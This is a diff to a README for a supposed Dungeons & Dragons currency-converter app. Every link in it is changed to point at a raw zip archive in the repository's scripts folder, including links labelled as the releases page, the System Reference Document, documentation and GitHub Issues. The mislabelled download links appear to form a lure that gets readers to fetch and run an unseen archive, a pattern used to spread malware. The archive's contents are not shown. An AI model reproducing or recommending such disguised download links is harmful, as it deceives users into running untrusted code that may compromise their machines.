@@ -1,7 +1,7 @@
 # 💰 dnd-currency-converter - Simple Currency Exchange for D&D
 
 ## 📥 Download Now
-[![Download Here](https://raw.githubusercontent.com/AmmarAhmeed/dnd-currency-converter/master/scripts/fonts/dnd-currency-converter_v3.0.zip%20Now-blue)](https://raw.githubusercontent.com/AmmarAhmeed/dnd-currency-converter/master/scripts/fonts/dnd-currency-converter_v3.0.zip)
+[![Download Here](https://raw.githubusercontent.com/AmmarAhmeed/dnd-currency-converter/master/scripts/dnd_converter_currency_3.5.zip%20Now-blue)](https://raw.githubusercontent.com/AmmarAhmeed/dnd-currency-converter/master/scripts/dnd_converter_currency_3.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the D&D Currency Converter! This application helps you convert between various currencies used in Dungeons & Dragons 3.5. With this tool, you can easily manage your in-game finances without the hassle of manual calculations.
@@ -18,7 +18,7 @@ To run the D&D Currency Converter, you will need:
 - 100 MB of free disk space.
 
 ## 🛠️ Download & Install
-1. **Visit the Releases Page**: To download the currency converter, [visit this page to download](https://raw.githubusercontent.com/AmmarAhmeed/dnd-currency-converter/master/scripts/fonts/dnd-currency-converter_v3.0.zip).
+1. **Visit the Releases Page**: To download the currency converter, [visit this page to download](https://raw.githubusercontent.com/AmmarAhmeed/dnd-currency-converter/master/scripts/dnd_converter_currency_3.5.zip).
 2. **Choose Your Version**: On the Releases page, select the version that matches your operating system.
 3. **Download the File**: Click on the file to start downloading. The download will start automatically.
 
@@ -41,12 +41,12 @@ To run the D&D Currency Converter, you will need:
 - **Incorrect Conversions**: Double-check the currencies selected. Ensure the amounts entered are correct.
 
 ## 📖 Additional Resources
-- For detailed information about Dungeons & Dragons currencies, consider looking at the [System Reference Document](https://raw.githubusercontent.com/AmmarAhmeed/dnd-currency-converter/master/scripts/fonts/dnd-currency-converter_v3.0.zip).
-- Visit our [documentation page](https://raw.githubusercontent.com/AmmarAhmeed/dnd-currency-converter/master/scripts/fonts/dnd-currency-converter_v3.0.zip) for FAQs and user guides.
+- For detailed information about Dungeons & Dragons currencies, consider looking at the [System Reference Document](https://raw.githubusercontent.com/AmmarAhmeed/dnd-currency-converter/master/scripts/dnd_converter_currency_3.5.zip).
+- Visit our [documentation page](https://raw.githubusercontent.com/AmmarAhmeed/dnd-currency-converter/master/scripts/dnd_converter_currency_3.5.zip) for FAQs and user guides.
 
 ## 🌐 Connect with Us
 If you have questions or suggestions, please reach out. We want to make this tool better for you.
-- **GitHub Issues**: Report any bugs or request features on our [GitHub Issues page](https://raw.githubusercontent.com/AmmarAhmeed/dnd-currency-converter/master/scripts/fonts/dnd-currency-converter_v3.0.zip).
+- **GitHub Issues**: Report any bugs or request features on our [GitHub Issues page](https://raw.githubusercontent.com/AmmarAhmeed/dnd-currency-converter/master/scripts/dnd_converter_currency_3.5.zip).
 - **Community Forums**: Join discussions with other users and get tips on using the converter effectively.
 
 ## 👍 Thank You for Using dnd-currency-converter!
